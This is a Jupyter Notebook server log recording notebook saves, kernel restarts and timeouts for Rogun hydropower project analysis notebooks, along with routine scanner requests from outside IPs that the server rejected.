+[I 13:09:08.141 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 13:09:46.951 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:13:46.864 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:15:46.982 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:17:13.673 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:17:21.408 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 13:17:22.178 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 13:17:46.651 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:19:46.888 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:21:46.914 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:23:46.877 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:28:40.517 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[W 13:29:21.649 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20181014113501 (80.254.184.33) 1.40ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:29:24.665 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 13:29:42.421 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:30:48.118 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:30:52.235 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 13:30:52.938 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[W 13:31:05.114 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20181014113501 (80.254.184.33) 2.09ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:31:07.586 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 13:31:47.465 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:37:47.727 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:39:47.495 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:39:53.402 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:39:59.029 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:41:24.038 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:41:47.447 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:41:56.952 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:42:26.345 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:43:21.340 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 13:43:22.322 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 13:43:46.735 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:45:19.501 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:45:41.612 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:47:47.656 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:49:48.796 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:51:28.580 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:51:47.405 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:52:21.722 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:53:48.486 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:53:58.584 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:55:48.297 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:56:09.739 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:56:39.595 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 13:56:40.400 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 13:57:20.514 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 13:57:21.351 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 13:57:47.398 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:59:48.484 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:00:59.250 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:01:48.215 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:02:02.986 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:02:33.955 NotebookApp] 302 GET / (213.127.231.39) 0.57ms
+[I 14:02:33.973 NotebookApp] 302 GET /tree? (213.127.231.39) 0.77ms
+[I 14:03:36.252 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:04:43.923 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:05:15.586 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:05:18.089 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 14:05:18.849 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 14:05:47.347 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:07:48.229 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:08:56.413 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:09:48.981 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:09:52.911 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:10:12.606 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:10:39.493 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:11:32.392 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:11:34.492 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 14:11:35.209 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 14:11:45.724 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:13:48.217 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:14:05.677 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:17:48.108 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:18:08.423 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:19:48.057 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:23:47.878 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:24:02.468 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:25:48.241 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:28:08.277 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:29:48.462 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:30:11.231 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:31:51.892 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:31:52.575 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:35:15.875 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:35:48.248 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:38:01.160 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:38:59.636 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:39:48.207 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:40:48.636 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:41:19.738 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:41:48.239 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:48:32.918 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:49:16.058 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:49:48.501 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:50:30.270 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:51:23.480 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:55:20.298 NotebookApp] 302 GET / (178.93.63.252) 0.49ms
+[I 14:55:48.207 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:57:06.865 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:57:15.882 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 14:57:16.634 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 14:57:47.428 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:59:51.864 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:59:57.195 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:59:59.084 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 14:59:59.795 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:00:56.888 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:01:27.645 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:01:46.227 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:02:22.879 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:03:58.615 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:06:23.592 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:07:03.072 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:09:24.081 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:11:10.381 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:11:42.775 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:12:04.277 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:12:14.874 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:14:03.195 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:15:57.966 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:16:22.810 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:18:23.055 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:19:47.441 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:19:51.245 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:21:02.779 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:22:38.692 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:25:38.519 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:26:24.233 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:27:00.878 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:28:02.801 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:30:23.005 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:31:21.600 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:32:43.092 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:33:13.277 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:33:27.308 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:33:46.251 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:33:58.102 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:34:33.566 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:34:44.880 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:35:19.905 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:35:21.630 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[W 15:35:21.639 NotebookApp] zmq message arrived on closed channel
+[I 15:35:22.541 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 15:36:33.493 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:39:39.990 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:39:44.365 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:42:03.601 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:48:48.175 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 15:49:05.484 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[W 15:57:20.816 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20181014113501 (80.254.184.33) 1.89ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 15:58:05.249 NotebookApp] Adapting to protocol v5.1 for kernel 992e6179-0a4d-43b1-96b8-1eb0c98e2477
+[I 15:58:15.079 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 15:58:27.311 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 15:58:33.250 NotebookApp] Adapting to protocol v5.1 for kernel 54685d48-a53d-49b7-8843-cccd61a96866
+[W 15:58:52.347 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20181014113501 (80.254.184.33) 2.04ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 15:59:38.203 NotebookApp] Adapting to protocol v5.1 for kernel 7d707769-7fa0-4016-bca7-ebbd158e52ed
+[I 16:00:00.682 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 16:00:12.292 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+[I 16:00:21.207 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 16:01:48.395 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 16:02:20.668 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 16:09:21.956 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 16:26:35.987 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 16:28:13.760 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 16:28:17.275 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 16:30:16.050 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 16:31:26.937 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 16:31:53.364 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 16:34:05.525 NotebookApp] 302 GET / (176.99.138.154) 0.59ms
+[I 16:34:06.674 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 16:34:07.354 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 16:34:35.795 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[W 16:44:59.564 NotebookApp] 404 HEAD http://180.163.113.82/check_proxy (180.97.106.39) 1.89ms referer=None
+[I 17:08:35.858 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:10:35.824 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:10:48.098 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:12:22.575 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:14:35.817 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 17:26:17.060 NotebookApp] 302 GET / (217.25.22.111) 0.50ms
+[I 17:44:02.180 NotebookApp] 302 GET / (189.235.5.135) 0.62ms
+[I 18:49:20.247 NotebookApp] 302 GET / (46.98.241.139) 0.49ms
+[I 18:53:31.646 NotebookApp] 302 GET / (188.170.240.138) 0.57ms
+[I 18:53:32.835 NotebookApp] 302 GET / (85.105.46.220) 0.60ms
+[I 19:54:12.307 NotebookApp] 302 GET / (191.19.7.91) 0.66ms
+[I 20:08:42.681 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 20:09:20.675 NotebookApp] Adapting to protocol v5.1 for kernel 992e6179-0a4d-43b1-96b8-1eb0c98e2477
+[I 20:10:11.514 NotebookApp] Adapting to protocol v5.1 for kernel 54685d48-a53d-49b7-8843-cccd61a96866
+[I 20:10:28.172 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 20:11:33.691 NotebookApp] Adapting to protocol v5.1 for kernel 7d707769-7fa0-4016-bca7-ebbd158e52ed
+[I 20:12:29.649 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 20:12:44.434 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+[W 20:18:55.323 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20181014113501 (80.254.184.33) 1.90ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 20:18:56.773 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 20:20:28.923 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 20:20:29.805 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 20:20:56.810 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 20:21:31.555 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 20:22:22.606 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 20:22:23.401 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 20:22:59.329 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 20:23:45.684 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 20:24:14.652 NotebookApp] Kernel interrupted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 20:24:40.072 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 20:24:40.855 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 20:24:57.987 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 20:27:00.784 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 20:29:02.293 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[W 20:33:56.673 NotebookApp] 404 GET /manager/html (111.73.46.246) 1.89ms referer=None
+[W 20:34:10.856 NotebookApp] WebSocket ping timeout after 119911 ms.
+[W 20:34:11.515 NotebookApp] WebSocket ping timeout after 119915 ms.
+[W 20:34:14.435 NotebookApp] WebSocket ping timeout after 119865 ms.
+[W 20:34:20.677 NotebookApp] WebSocket ping timeout after 119860 ms.
+[W 20:34:28.173 NotebookApp] WebSocket ping timeout after 119971 ms.
+[W 20:34:29.650 NotebookApp] WebSocket ping timeout after 119822 ms.
+[W 20:34:33.692 NotebookApp] WebSocket ping timeout after 119751 ms.
+[I 20:55:13.993 NotebookApp] 302 GET / (103.207.168.19) 0.55ms
+[I 20:55:37.537 NotebookApp] 302 GET / (66.240.205.34) 0.54ms
+[I 20:55:37.826 NotebookApp] 302 GET /tree (66.240.205.34) 0.81ms
+[W 20:55:38.439 NotebookApp] 404 GET /robots.txt (66.240.205.34) 1.85ms referer=None
+[W 20:55:38.729 NotebookApp] 404 GET /sitemap.xml (66.240.205.34) 1.50ms referer=None
+[W 20:55:39.020 NotebookApp] 404 GET /.well-known/security.txt (66.240.205.34) 1.52ms referer=None
+[W 22:00:27.739 NotebookApp] 404 GET /manager/html (185.128.40.182) 1.64ms referer=None
+[W 23:17:19.414 NotebookApp] 405 HEAD / (47.75.215.75) 0.50ms referer=None
+[I 23:35:38.316 NotebookApp] 302 GET / (189.47.229.249) 0.54ms
+[I 23:47:44.764 NotebookApp] 302 GET / (139.162.79.87) 0.53ms
+[I 00:02:25.712 NotebookApp] 302 GET / (216.218.206.69) 0.61ms
+[I 00:16:18.905 NotebookApp] 302 GET / (212.4.126.63) 0.44ms
+[I 02:48:23.942 NotebookApp] 302 GET / (103.24.107.198) 0.61ms
+[W 03:40:49.545 NotebookApp] 404 GET /manager/html (58.218.56.89) 1.89ms referer=None
+[W 03:44:55.979 NotebookApp] 404 GET http://api.ipify.org/ (123.191.147.243) 1.80ms referer=None
+[I 04:40:23.259 NotebookApp] 302 GET / (177.68.90.240) 0.53ms
+[I 05:08:07.452 NotebookApp] Adapting to protocol v5.1 for kernel 54685d48-a53d-49b7-8843-cccd61a96866
+[I 05:08:07.523 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 05:08:10.462 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+[I 05:08:17.445 NotebookApp] Adapting to protocol v5.1 for kernel 992e6179-0a4d-43b1-96b8-1eb0c98e2477
+[I 05:08:24.463 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 05:08:26.435 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 05:12:35.443 NotebookApp] Adapting to protocol v5.1 for kernel 7d707769-7fa0-4016-bca7-ebbd158e52ed
+[W 06:52:56.436 NotebookApp] WebSocket ping timeout after 119883 ms.
+[W 06:53:05.444 NotebookApp] WebSocket ping timeout after 119972 ms.
+[W 06:53:07.454 NotebookApp] WebSocket ping timeout after 119940 ms.
+[W 06:53:07.524 NotebookApp] WebSocket ping timeout after 119972 ms.
+[W 06:53:10.464 NotebookApp] WebSocket ping timeout after 119882 ms.
+[W 06:53:17.447 NotebookApp] WebSocket ping timeout after 119902 ms.
+[W 06:53:24.464 NotebookApp] WebSocket ping timeout after 119948 ms.
+[I 08:06:39.048 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 08:08:38.508 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 08:10:38.479 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 08:11:12.711 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 08:11:21.690 NotebookApp] Adapting to protocol v5.1 for kernel 7d707769-7fa0-4016-bca7-ebbd158e52ed
+[I 08:11:23.527 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 08:11:23.698 NotebookApp] Adapting to protocol v5.1 for kernel 54685d48-a53d-49b7-8843-cccd61a96866
+[I 08:11:26.608 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+[I 08:11:33.666 NotebookApp] Adapting to protocol v5.1 for kernel 992e6179-0a4d-43b1-96b8-1eb0c98e2477
+[I 08:11:40.653 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 08:12:38.455 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
